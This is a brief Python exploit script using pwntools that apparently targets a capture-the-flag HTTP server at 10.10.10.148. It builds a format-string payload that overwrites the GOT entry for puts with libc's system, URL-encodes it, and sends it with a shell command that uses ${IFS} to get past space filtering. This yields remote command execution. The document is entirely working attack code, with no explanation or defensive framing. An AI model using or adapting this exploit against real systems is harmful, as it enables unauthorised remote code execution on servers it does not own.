from pwn import *
import requests

def aggressive_url_encode(string):
    return "".join("%{0:0>2}".format(format(char,"x")) for char in string)

elf = ELF("/home/maki/httpserver")
libc = ELF("/home/maki/Downloads/libc-2.27.so")
binbase = 0x565a4000
libc.addr = 0xf7da0000

payload = aggressive_url_encode(fmtstr_payload(53, { elf.got['puts']+binbase: libc.sym['system']+libc.addr}))
print(repr(payload))

command = "sleep 50".replace(' ', '${IFS}') 
print("\n[+] Command",command)

r = remote("10.10.10.148",9999)
r.send('''{} /{} HTTP/1.1\r\n\r\n\r\n'''.format(command, payload))
